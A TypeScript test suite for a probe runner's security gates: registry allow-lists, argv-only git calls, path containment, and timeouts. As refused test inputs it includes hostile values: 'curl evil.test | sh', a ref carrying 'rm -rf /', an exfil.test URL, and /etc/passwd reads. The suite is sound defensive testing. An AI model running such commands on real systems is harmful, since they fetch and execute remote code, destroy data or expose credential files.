import { expect, test } from "bun:test";
import {
  allProbesPassed,
  assertClosable,
  authorizeProbeTree,
  boundObserved,
  isProbeRefusal,
  resolvedProbePaths,
  runProbe,
  runProbes,
  PROBE_ESCAPED_PREFIX,
  type CloseReceipt,
  type CommandOutcome,
  type CommandRequest,
  type DeclaredCommand,
  type Probe,
  type ProbeRegistry,
  type ProbeRunnerOptions,
  type WorkGraphNode,
} from "../src/index";

const AT = new Date("2026-08-04T09:00:00.000Z");
const REPO = "the-metafactory/soma";
const REGISTRY_PATH = "/home/.soma/policy/probe-registry.json";

/**
 * Every `command` and `url` probe in this file runs under a registry that
 * declares it — the gate is deny-by-default (DD-16 Amendment A), so a runner
 * test with no registry would be testing the refusal, not the runner.
 */
function registry(commands: DeclaredCommand[] = [], urlHosts: string[] = []): ProbeRegistry {
  return { status: "loaded", repo: REPO, path: REGISTRY_PATH, commands, urlHosts };
}

const ALL_DECLARED = registry(
  [
    { run: "bun test", cwd: "/repo" },
    { run: "sleep 999", cwd: "/repo" },
    { run: "first", cwd: "/repo" },
    { run: "second", cwd: "/repo" },
  ],
  ["example.test"],
);

function deps(
  overrides: {
    command?: (request: CommandRequest) => CommandOutcome;
    fetchStatus?: (target: string) => Promise<number>;
    pathExists?: (path: string) => boolean;
    registry?: ProbeRegistry;
  } = {},
): ProbeRunnerOptions {
  const calls: CommandRequest[] = [];
  return {
    cwd: "/repo",
    registry: overrides.registry ?? ALL_DECLARED,
    deps: {
      runCommand: async (request) => {
        calls.push(request);
        return overrides.command?.(request) ?? { exitCode: 0, stdout: "", stderr: "", timedOut: false };
      },
      ...(overrides.fetchStatus === undefined ? {} : { fetchStatus: overrides.fetchStatus }),
      ...(overrides.pathExists === undefined ? {} : { pathExists: overrides.pathExists }),
      now: () => AT,
    },
  };
}

function requireProbed(result: Awaited<ReturnType<typeof runProbe>>): {
  outcome: "pass" | "fail";
  observed: string;
  at: string;
} {
  if (result.state !== "probed") throw new Error("runner returned a specified result — it must always run the probe");
  return { outcome: result.outcome, observed: result.observed, at: result.at };
}

test("a command probe passes only on the declared exit code, and records exit + output tail", async () => {
  const probe: Probe = { type: "command", run: "bun test", timeoutSec: 600, expectExit: 0 };

  const pass = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: 0, stdout: "640 pass", stderr: "", timedOut: false }) })),
  );
  expect(pass.outcome).toBe("pass");
  expect(pass.observed).toContain("exit 0");
  expect(pass.observed).toContain("640 pass");
  expect(pass.at).toBe(AT.toISOString());

  const fail = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: 1, stdout: "", stderr: "2 fail", timedOut: false }) })),
  );
  expect(fail.outcome).toBe("fail");
  expect(fail.observed).toContain("expected exit 0");
});

test("timeout expiry is probe failure, never a pass and never a hang (§2.2)", async () => {
  const probe: Probe = { type: "command", run: "sleep 999", timeoutSec: 5, expectExit: 0 };
  const result = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: null, stdout: "", stderr: "", timedOut: true }) })),
  );

  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("timed out after 5s");
});

test("a runner error is a failed probe, not an exception — fail-closed", async () => {
  const probe: Probe = { type: "url", target: "https://example.test/health", expectStatus: 200 };
  const result = requireProbed(
    await runProbe(probe, {
      cwd: "/repo",
      registry: ALL_DECLARED,
      deps: {
        fetchStatus: async () => {
          throw new Error("ECONNREFUSED");
        },
        now: () => AT,
      },
    }),
  );

  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("ECONNREFUSED");
});

test("a url probe compares the status it was told to expect", async () => {
  const probe: Probe = { type: "url", target: "https://example.test/", expectStatus: 204 };

  expect(requireProbed(await runProbe(probe, deps({ fetchStatus: async () => 204 }))).outcome).toBe("pass");
  const wrong = requireProbed(await runProbe(probe, deps({ fetchStatus: async () => 500 })));
  expect(wrong.outcome).toBe("fail");
  expect(wrong.observed).toContain("expected 204");
});

test("git probes run as argv, never through a shell — a ref name cannot inject", async () => {
  const seen: CommandRequest[] = [];
  const probe: Probe = { type: "git-ref-exists", ref: "feat/x; rm -rf /" };

  await runProbe(probe, {
    cwd: "/repo",
    deps: {
      runCommand: async (request) => {
        seen.push(request);
        return { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false };
      },
      now: () => AT,
    },
  });

  expect(seen).toHaveLength(1);
  expect(seen[0].shell).toBeUndefined();
  expect(seen[0].argv).toEqual(["git", "-C", "/repo", "rev-parse", "--verify", "--quiet", "feat/x; rm -rf /^{commit}"]);
});

test("git-ref-exists reports the resolved sha when it passes", async () => {
  const result = requireProbed(
    await runProbe(
      { type: "git-ref-exists", ref: "main" },
      deps({ command: () => ({ exitCode: 0, stdout: "deadbeef\n", stderr: "", timedOut: false }) }),
    ),
  );
  expect(result.outcome).toBe("pass");
  expect(result.observed).toContain("deadbeef");
});

test("git-merged-into fails when the ref is not an ancestor", async () => {
  const result = requireProbed(
    await runProbe(
      { type: "git-merged-into", ref: "feat/work-graph-primitive", into: "main" },
      deps({
        command: (request) =>
          request.argv?.includes("merge-base") === true
            ? { exitCode: 1, stdout: "", stderr: "", timedOut: false }
            : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false },
      }),
    ),
  );

  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("is not an ancestor of main");
});

test("artifact-exists checks the filesystem without atRef and the tree with it", async () => {
  const onDisk = requireProbed(
    await runProbe({ type: "artifact-exists", path: "src/work-graph.ts" }, deps({ pathExists: () => true })),
  );
  expect(onDisk.outcome).toBe("pass");

  const seen: CommandRequest[] = [];
  const atRef = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "src/work-graph.ts", atRef: "main" },
      {
        cwd: "/repo",
        deps: {
          // Real-git-shaped (#662 review m3): the ref resolves, and the absent
          // path comes back 128, because `cat-file -e <ref>:<path>` reports a
          // missing path as a fatal rather than as exit 1. This stub used to
          // return 1 for both calls — a value real git never produces for this
          // argv, which is how the inverted split shipped green.
          runCommand: async (request) => {
            seen.push(request);
            return request.argv?.includes("cat-file") === true
              ? { exitCode: 128, stdout: "", stderr: "fatal: path 'src/work-graph.ts' does not exist in 'main'\n", timedOut: false }
              : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false };
          },
          now: () => AT,
        },
      },
    ),
  );
  // Reachability first, then the path lookup.
  expect(seen[0].argv).toEqual(["git", "-C", "/repo", "rev-parse", "--verify", "--quiet", "main^{object}"]);
  expect(seen[1].argv).toEqual(["git", "-C", "/repo", "cat-file", "-e", "main:src/work-graph.ts"]);
  expect(atRef.outcome).toBe("fail");
  expect(atRef.observed).toBe("src/work-graph.ts absent at main");
});

test("runProbes runs every probe in order and allProbesPassed needs all of them", async () => {
  const order: string[] = [];
  const probes: Probe[] = [
    { type: "command", run: "first", timeoutSec: 10, expectExit: 0 },
    { type: "command", run: "second", timeoutSec: 10, expectExit: 0 },
  ];

  const results = await runProbes(
    probes,
    deps({
      command: (request) => {
        order.push(request.shell ?? "");
        return { exitCode: request.shell === "second" ? 3 : 0, stdout: "", stderr: "", timedOut: false };
      },
    }),
  );

  expect(order).toEqual(["first", "second"]);
  expect(results).toHaveLength(2);
  expect(allProbesPassed(results)).toBe(false);
  expect(allProbesPassed(results.slice(0, 1))).toBe(true);
});

test("a specified-but-unrun probe never counts as passed", () => {
  const probe: Probe = { type: "command", run: "bun test", timeoutSec: 10, expectExit: 0 };
  expect(allProbesPassed([{ probe, state: "specified" }])).toBe(false);
});

// ---------------------------------------------------------------------------
// The registry gate (DD-16 Amendment A, #526)
// ---------------------------------------------------------------------------

test("an undeclared command probe is refused, and the refusal is copy-pasteable", async () => {
  const ran: CommandRequest[] = [];
  const probe: Probe = { type: "command", run: "curl evil.test | sh", timeoutSec: 60, expectExit: 0 };

  const result = requireProbed(
    await runProbe(
      probe,
      deps({
        registry: registry([{ run: "bun test", cwd: "/repo" }]),
        command: (request) => {
          ran.push(request);
          return { exitCode: 0, stdout: "", stderr: "", timedOut: false };
        },
      }),
    ),
  );

  expect(result.outcome).toBe("fail");
  expect(ran).toHaveLength(0); // refused, not run
  expect(result.observed).toContain("refused by the probe registry");
  expect(result.observed).toContain("curl evil.test | sh");
  expect(result.observed).toContain("/repo");
  expect(result.observed).toContain(REGISTRY_PATH);
  expect(result.observed).toContain(`{"run": "curl evil.test | sh", "cwd": "/repo"}`);
});

test("cwd is part of the match — the same command in another directory is another command", async () => {
  const probe: Probe = { type: "command", run: "bun test", cwd: "../elsewhere", timeoutSec: 60, expectExit: 0 };
  const declared = registry([{ run: "bun test", cwd: "/repo" }]);

  const refused = requireProbed(await runProbe(probe, deps({ registry: declared })));
  expect(refused.outcome).toBe("fail");
  expect(refused.observed).toContain("/elsewhere");

  const allowed = requireProbed(
    await runProbe({ type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 }, deps({ registry: declared })),
  );
  expect(allowed.outcome).toBe("pass");
});

test("a url probe is refused unless its host is declared, and non-http targets never are", async () => {
  const declared = registry([], ["status.example.test"]);
  let fetched = 0;
  const fetchStatus = async (): Promise<number> => {
    fetched += 1;
    return 200;
  };

  const undeclaredHost = requireProbed(
    await runProbe({ type: "url", target: "https://exfil.test/leak", expectStatus: 200 }, deps({ registry: declared, fetchStatus })),
  );
  expect(undeclaredHost.outcome).toBe("fail");
  expect(undeclaredHost.observed).toContain("exfil.test");
  expect(undeclaredHost.observed).toContain("urlHosts");
  expect(fetched).toBe(0); // no request left the machine

  const localFile = requireProbed(
    await runProbe({ type: "url", target: "file:///etc/passwd", expectStatus: 200 }, deps({ registry: declared, fetchStatus })),
  );
  expect(localFile.outcome).toBe("fail");
  expect(localFile.observed).toContain("not an http(s) URL");
  expect(fetched).toBe(0);

  const declaredHost = requireProbed(
    await runProbe({ type: "url", target: "https://STATUS.example.test/health", expectStatus: 200 }, deps({ registry: declared, fetchStatus })),
  );
  expect(declaredHost.outcome).toBe("pass");
  expect(fetched).toBe(1);
});

test("a machine with no registry refuses command and url probes but still runs the argv ones", async () => {
  const absent: ProbeRegistry = { status: "absent", repo: REPO, path: REGISTRY_PATH };

  const command = requireProbed(
    await runProbe({ type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 }, deps({ registry: absent })),
  );
  expect(command.outcome).toBe("fail");
  expect(command.observed).toContain("no registry exists at");
  expect(command.observed).toContain(`"version": 1`); // the starter document to create

  const url = requireProbed(
    await runProbe({ type: "url", target: "https://example.test/", expectStatus: 200 }, deps({ registry: absent })),
  );
  expect(url.outcome).toBe("fail");

  const gitRef = requireProbed(
    await runProbe(
      { type: "git-ref-exists", ref: "main" },
      deps({ registry: absent, command: () => ({ exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false }) }),
    ),
  );
  expect(gitRef.outcome).toBe("pass");

  const artifact = requireProbed(
    await runProbe({ type: "artifact-exists", path: "src/work-graph.ts" }, deps({ registry: absent, pathExists: () => true })),
  );
  expect(artifact.outcome).toBe("pass");
});

test("an unusable registry refuses rather than falling open", async () => {
  const invalid: ProbeRegistry = {
    status: "invalid",
    repo: REPO,
    path: REGISTRY_PATH,
    reason: "is not valid JSON: Unexpected token",
  };

  const result = requireProbed(
    await runProbe({ type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 }, deps({ registry: invalid })),
  );
  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("is unusable");
  expect(result.observed).toContain("not valid JSON");
});

test("the runner refuses gated probes when no registry is supplied at all", async () => {
  const result = requireProbed(
    await runProbe(
      { type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 },
      { cwd: "/repo", deps: { now: () => AT } },
    ),
  );
  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("given no registry");
});

test("isProbeRefusal separates a gate refusal from a command that ran and failed", async () => {
  const refused = await runProbe(
    { type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 },
    deps({ registry: registry() }),
  );
  const failed = await runProbe(
    { type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 },
    deps({ command: () => ({ exitCode: 1, stdout: "", stderr: "boom", timedOut: false }) }),
  );

  expect(isProbeRefusal(refused)).toBe(true);
  expect(isProbeRefusal(failed)).toBe(false);
  expect(isProbeRefusal({ probe: refused.probe, state: "specified" })).toBe(false);
});

test("observed output keeps the tail, where the failure reason lives", () => {
  const long = `${"x".repeat(5_000)}THE-REASON`;
  const bounded = boundObserved(long, 20);
  expect(bounded).toContain("THE-REASON");
  expect(bounded.length).toBeLessThan(30);
});

// ---------------------------------------------------------------------------
// Operational envelope (#527/#592)
// ---------------------------------------------------------------------------

test("a passing command records a short tail; a failing one keeps the long one", async () => {
  // Measured motivation: `bun test` emits ~17k characters, of which the old
  // 1 200-char tail kept 7.1% — all of it install logging on the way to a
  // summary that was already there. A green probe does not need 1 200 characters
  // to say yes; a red one needs every one of them to say why.
  const noisy = `${"x".repeat(5_000)}\nRESULT LINE`;
  const probe: Probe = { type: "command", run: "bun test", timeoutSec: 600, expectExit: 0 };

  const pass = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: 0, stdout: noisy, stderr: "", timedOut: false }) })),
  );
  const fail = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: 1, stdout: noisy, stderr: "", timedOut: false }) })),
  );

  expect(pass.observed.length).toBeLessThan(300);
  expect(fail.observed.length).toBeGreaterThan(1_000);
  // Both keep the END of the output, which is where the summary and the reason
  // both live — the size changes, the shape does not.
  expect(pass.observed).toContain("RESULT LINE");
  expect(fail.observed).toContain("RESULT LINE");
});

test("the close deadline stops the sequence, and the unrun probes are failed, not skipped", async () => {
  // A clock that jumps 400s per read: probe 1 runs, then the deadline is past.
  let tick = 0;
  const probes: Probe[] = [
    { type: "command", run: "first", timeoutSec: 600, expectExit: 0 },
    { type: "command", run: "second", timeoutSec: 600, expectExit: 0 },
    { type: "command", run: "third", timeoutSec: 600, expectExit: 0 },
  ];
  const ran: string[] = [];

  const results = await runProbes(probes, {
    cwd: "/repo",
    registry: registry([
      { run: "first", cwd: "/repo" },
      { run: "second", cwd: "/repo" },
      { run: "third", cwd: "/repo" },
    ]),
    deadlineSec: 500,
    deps: {
      runCommand: async (request) => {
        ran.push(request.shell ?? "");
        return { exitCode: 0, stdout: "ok", stderr: "", timedOut: false };
      },
      now: () => new Date(AT.getTime() + tick++ * 400_000),
    },
  });

  expect(ran).toEqual(["first"]);
  expect(results.map((r) => (r.state === "probed" ? r.outcome : "specified"))).toEqual(["pass", "fail", "fail"]);
  const second = results[1];
  expect(second.state === "probed" ? second.observed : "").toContain("close deadline of 500s exceeded");
  expect(second.state === "probed" ? second.observed : "").toContain("did not run");
  // No directory on a probe that ran nowhere — naming one would be a true-looking
  // fact about nothing (#579).
  expect(second.state === "probed" ? second.cwd : "unset").toBeUndefined();
  // Failed, never skipped, so the existing close gate refuses without a new rule.
  expect(allProbesPassed(results)).toBe(false);
});

test("a probe's own timeout is clamped to what the deadline leaves, and says which clock killed it", async () => {
  const seen: CommandRequest[] = [];
  const results = await runProbes([{ type: "command", run: "slow", timeoutSec: 600, expectExit: 0 }], {
    cwd: "/repo",
    registry: registry([{ run: "slow", cwd: "/repo" }]),
    deadlineSec: 30,
    deps: {
      runCommand: async (request) => {
        seen.push(request);
        return { exitCode: null, stdout: "", stderr: "", timedOut: true };
      },
      now: () => AT,
    },
  });

  expect(seen[0].timeoutSec).toBe(30);
  const only = results[0];
  expect(only.state === "probed" ? only.observed : "").toContain("the close deadline left no more time");
  // A probe that outran its OWN timeout reads differently — same kill, different
  // diagnosis, and the fixes are not the same.
  expect(only.state === "probed" ? only.observed : "").not.toContain("timed out after");
});

test("git probes are clamped too, so a probe cannot outlive the close it belongs to", async () => {
  const seen: CommandRequest[] = [];
  await runProbes([{ type: "git-ref-exists", ref: "HEAD" }], {
    cwd: "/repo",
    deadlineSec: 10,
    deps: {
      runCommand: async (request) => {
        seen.push(request);
        return { exitCode: 0, stdout: "cafef00d", stderr: "", timedOut: false };
      },
      now: () => AT,
    },
  });

  // GIT_TIMEOUT_SEC is 60; the remainder is 10, and the smaller wins.
  expect(seen[0].timeoutSec).toBe(10);
});

test("a close inside the deadline is untouched", async () => {
  const results = await runProbes([{ type: "command", run: "bun test", timeoutSec: 600, expectExit: 0 }], {
    cwd: "/repo",
    registry: ALL_DECLARED,
    deps: {
      runCommand: async () => ({ exitCode: 0, stdout: "640 pass", stderr: "", timedOut: false }),
      now: () => AT,
    },
  });

  expect(allProbesPassed(results)).toBe(true);
});

// ---------------------------------------------------------------------------
// Containment: the ungated probes read the stated tree and nothing else (#582)
// ---------------------------------------------------------------------------
//
// DD-16 Amendment A ungated the three argv probes as "bounded to existence
// checks in a local tree". That clause was false as written (#529): `repo` and
// `path` are tracker content resolved against the runner's base cwd, and at
// `dfea720` a node body could probe `/etc/passwd` or `~/.ssh/id_rsa` and read
// the answer back out of its own close receipt.

/** No registry needed: containment refuses before the gate, and these types are ungated anyway. */
function contained(cwd = "/repo"): ProbeRunnerOptions {
  return { cwd, deps: { pathExists: () => true, now: () => AT } };
}

const ESCAPES: { what: string; probe: Probe }[] = [
  { what: "git-ref-exists via a relative repo", probe: { type: "git-ref-exists", ref: "HEAD", repo: "../.." } },
  { what: "git-merged-into via a relative repo", probe: { type: "git-merged-into", ref: "x", into: "main", repo: "../.." } },
  { what: "artifact-exists via a relative repo", probe: { type: "artifact-exists", path: "README.md", repo: "../.." } },
  { what: "git-ref-exists via an absolute repo", probe: { type: "git-ref-exists", ref: "HEAD", repo: "/elsewhere" } },
  { what: "git-merged-into via an absolute repo", probe: { type: "git-merged-into", ref: "x", into: "main", repo: "/elsewhere" } },
  { what: "artifact-exists via an absolute repo", probe: { type: "artifact-exists", path: "README.md", repo: "/elsewhere" } },
];

test("every ungated probe type is refused when its repo escapes the stated tree", async () => {
  for (const escape of ESCAPES) {
    const result = requireProbed(await runProbe(escape.probe, contained()));
    // The label rides in the assertion so a failing row says which one.
    expect(`${escape.what}: ${result.outcome}`).toBe(`${escape.what}: fail`);
    expect(result.observed).toContain(PROBE_ESCAPED_PREFIX);
    // The base tree *and* the resolved path, because the node's literal field and
    // the directory the runner would touch are different strings (#526's lesson).
    expect(result.observed).toContain("/repo");
  }
});

test("an absolute artifact-exists path escapes with no repo at all", async () => {
  // #582's premise correction: #529 asked whether `repo` was bounded, and `path`
  // resolves against the cwd too. A check that saw only the directory would pass
  // this probe — as dfea720 did, live, against /etc/passwd.
  const result = requireProbed(await runProbe({ type: "artifact-exists", path: "/etc/passwd" }, contained()));

  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain(PROBE_ESCAPED_PREFIX);
  expect(result.observed).toContain("/etc/passwd");
});

test("containment is separator-aware — /base-evil is not a descendant of /base", async () => {
  const sibling = requireProbed(
    await runProbe({ type: "git-ref-exists", ref: "HEAD", repo: "/base-evil" }, contained("/base")),
  );
  expect(sibling.outcome).toBe("fail");
  expect(sibling.observed).toContain(PROBE_ESCAPED_PREFIX);
});

test("a contained probe still runs — the tree itself, and any descendant of it", async () => {
  const seen: CommandRequest[] = [];
  const options: ProbeRunnerOptions = {
    cwd: "/repo",
    deps: {
      runCommand: async (request) => {
        seen.push(request);
        return { exitCode: 0, stdout: "cafef00d", stderr: "", timedOut: false };
      },
      pathExists: () => true,
      now: () => AT,
    },
  };

  const base = requireProbed(await runProbe({ type: "git-ref-exists", ref: "HEAD" }, options));
  expect(base.outcome).toBe("pass");

  const subdirectory = requireProbed(
    await runProbe({ type: "git-ref-exists", ref: "HEAD", repo: "vendor/checkout" }, options),
  );
  expect(subdirectory.outcome).toBe("pass");
  expect(seen[1].argv).toEqual([
    "git",
    "-C",
    "/repo/vendor/checkout",
    "rev-parse",
    "--verify",
    "--quiet",
    "HEAD^{commit}",
  ]);

  const descendantPath = requireProbed(await runProbe({ type: "artifact-exists", path: "src/thing.ts" }, options));
  expect(descendantPath.outcome).toBe("pass");
});

test("an atRef artifact-exists reads through git, so only its directory is contained", async () => {
  // `path` there is a repository-relative object name handed to `git cat-file`,
  // never a filesystem path — so an absolute-looking one is a lookup that fails,
  // not an escape to refuse. Containment must not invent a second meaning for it.
  const seen: CommandRequest[] = [];
  const result = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "/etc/passwd", atRef: "main" },
      {
        cwd: "/repo",
        deps: {
          // Real-git-shaped (#662 review m3): the ref resolves, the object name
          // does not exist, and `cat-file -e` reports that with 128.
          runCommand: async (request) => {
            seen.push(request);
            return request.argv?.includes("cat-file") === true
              ? { exitCode: 128, stdout: "", stderr: "fatal: path '/etc/passwd' does not exist in 'main'\n", timedOut: false }
              : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false };
          },
          now: () => AT,
        },
      },
    ),
  );

  expect(result.observed).not.toContain(PROBE_ESCAPED_PREFIX);
  // The path still reaches git verbatim as an object name — the reachability
  // call added in #662 review B1 runs ahead of it and does not touch `path`.
  expect(seen[1].argv).toEqual(["git", "-C", "/repo", "cat-file", "-e", "main:/etc/passwd"]);
  expect(result.outcome).toBe("fail");
});

test("an escape is a probed failure, so the close gate refuses through the path it already owns", async () => {
  const probe: Probe = { type: "artifact-exists", path: "/etc/passwd" };
  const result = await runProbe(probe, contained());
  const node: WorkGraphNode = {
    id: "582",
    title: "containment",
    autonomy: "auto",
    checkpointId: "cp-x",
    probes: [probe],
  };
  const receipt: CloseReceipt = {
    checkpointId: "cp-x",
    closedBy: "jcfischer",
    at: AT.toISOString(),
    evidence: [{ kind: "probed", summary: "1 probe", pointer: "https://example.test/#issuecomment-1" }],
    probeResults: [result],
    attestation: "unverified",
  };

  // Not a new outcome and not an exception: "the node named a tree it may not
  // read" and "the command ran and failed" are both simply *not passed*.
  expect(result.state).toBe("probed");
  expect(() => {
    assertClosable(node, receipt);
  }).toThrow(/ran and failed/u);
});

test("containment does not apply to command and url — the registry is their stronger bound", () => {
  // A declared `cwd` is an absolute directory the adopter wrote in soma-home,
  // matched byte for byte. Containment on top would forbid that deliberate act,
  // which is precisely the authority the three argv probes never pass through.
  const command: Probe = { type: "command", run: "bun test", timeoutSec: 60, expectExit: 0, cwd: "/elsewhere" };
  const url: Probe = { type: "url", target: "https://example.test/health", expectStatus: 200 };

  expect(authorizeProbeTree(command, "/repo").allowed).toBe(true);
  expect(authorizeProbeTree(url, "/repo").allowed).toBe(true);
});

test("resolvedProbePaths names every path a probe touches, and the field it came from", () => {
  expect(resolvedProbePaths({ type: "artifact-exists", path: "docs/x.md", repo: "sub" }, "/repo")).toEqual([
    { field: "repo", value: "sub", resolved: "/repo/sub" },
    { field: "path", value: "docs/x.md", resolved: "/repo/sub/docs/x.md" },
  ]);
  expect(resolvedProbePaths({ type: "url", target: "https://example.test/", expectStatus: 200 }, "/repo")).toEqual([]);
});

// --- "could not reach the tree" is not "the artifact is absent" (#662) ------

test("an artifact-exists atRef in a directory git cannot read says so, and names the directory", async () => {
  // #662's reported symptom. The probe base was the install tree, `git cat-file`
  // exited 128, and the receipt said `docs/x.md absent at main` — so the reporter
  // went hunting for a file that was present in the tree they ran the close from.
  // The two failures have different fixes, so they must read differently.
  const unreadable = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "docs/x.md", atRef: "main" },
      deps({
        command: () => ({
          exitCode: 128,
          stdout: "",
          stderr: "fatal: not a git repository (or any of the parent directories): .git\n",
          timedOut: false,
        }),
      }),
    ),
  );

  expect(unreadable.outcome).toBe("fail");
  expect(unreadable.observed).toContain("could not reach main in /repo");
  expect(unreadable.observed).toContain("git exited 128");
  expect(unreadable.observed).toContain("not a git repository");
  // The word that sent the reporter to the wrong place must not appear.
  expect(unreadable.observed).not.toContain("absent");

  // And a genuine absence still reads as absence. `cat-file -e` reports a
  // missing path with 128, the SAME code a missing tree gives, so this case is
  // separated by the ref resolving first — never by the path lookup's own exit
  // code (#662 review B1).
  const absent = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "docs/x.md", atRef: "main" },
      deps({
        command: (request) =>
          request.argv?.includes("cat-file") === true
            ? { exitCode: 128, stdout: "", stderr: "fatal: path 'docs/x.md' does not exist in 'main'\n", timedOut: false }
            : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false },
      }),
    ),
  );
  expect(absent.outcome).toBe("fail");
  expect(absent.observed).toBe("docs/x.md absent at main");

  // A ref that does not resolve in a valid repository is a third thing again:
  // not the tree being unreachable, not the path being absent.
  const badRef = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "docs/x.md", atRef: "nosuchref" },
      deps({ command: () => ({ exitCode: 1, stdout: "", stderr: "", timedOut: false }) }),
    ),
  );
  expect(badRef.outcome).toBe("fail");
  expect(badRef.observed).toBe("nosuchref does not resolve in /repo");
});

test("the reachability split covers the other two git probes, on both of git-merged-into's refs", async () => {
  // Same helper, three call sites: `does not resolve in /repo` is a plausible
  // way to say "this is not a repository", and `is not an ancestor of main` is a
  // plausible way to say "there is no main here". Both would send a reader after
  // the wrong defect.
  const refExists = requireProbed(
    await runProbe(
      { type: "git-ref-exists", ref: "main" },
      deps({ command: () => ({ exitCode: 128, stdout: "", stderr: "fatal: not a git repository\n", timedOut: false }) }),
    ),
  );
  expect(refExists.outcome).toBe("fail");
  expect(refExists.observed).toContain("could not reach main in /repo");
  expect(refExists.observed).not.toContain("does not resolve");

  // An `into` that does not resolve fails on the second git call, after the ref
  // itself resolved fine.
  const badInto = requireProbed(
    await runProbe(
      { type: "git-merged-into", ref: "feat/x", into: "main" },
      deps({
        command: (request) =>
          request.argv?.includes("merge-base") === true
            ? { exitCode: 128, stdout: "", stderr: "fatal: Not a valid object name main\n", timedOut: false }
            : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false },
      }),
    ),
  );
  expect(badInto.outcome).toBe("fail");
  expect(badInto.observed).toContain("could not reach main in /repo");
  expect(badInto.observed).not.toContain("is not an ancestor");

  // Exit 1 on the same call is the honest "no", and keeps its message.
  const notAncestor = requireProbed(
    await runProbe(
      { type: "git-merged-into", ref: "feat/x", into: "main" },
      deps({
        command: (request) =>
          request.argv?.includes("merge-base") === true
            ? { exitCode: 1, stdout: "", stderr: "", timedOut: false }
            : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false },
      }),
    ),
  );
  expect(notAncestor.observed).toContain("is not an ancestor of main");
});

test("a git probe killed by a timeout reads as unreachable, never as a confident answer", async () => {
  // A killed spawn reports `exitCode: null`; before #662 that fell through the
  // `exitCode === 0` comparison and rendered as `absent`, which is a claim about
  // a question git never got to answer.
  const onReachability = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "docs/x.md", atRef: "main" },
      deps({ command: () => ({ exitCode: null, stdout: "", stderr: "", timedOut: true }) }),
    ),
  );

  expect(onReachability.outcome).toBe("fail");
  expect(onReachability.observed).toContain("could not reach main in /repo");
  expect(onReachability.observed).toContain("git timed out (killed)");
  expect(onReachability.observed).not.toContain("absent");

  // The deadline can also land on the *second* call, after the ref has resolved.
  // That path reads only the timeout — every other non-zero there is the path's
  // answer — so it needs its own case or the narrower predicate goes untested.
  const onLookup = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "docs/x.md", atRef: "main" },
      deps({
        command: (request) =>
          request.argv?.includes("cat-file") === true
            ? { exitCode: null, stdout: "", stderr: "", timedOut: true }
            : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false },
      }),
    ),
  );

  expect(onLookup.outcome).toBe("fail");
  expect(onLookup.observed).toContain("could not reach main in /repo");
  expect(onLookup.observed).toContain("git timed out (killed)");
  expect(onLookup.observed).not.toContain("absent");
});
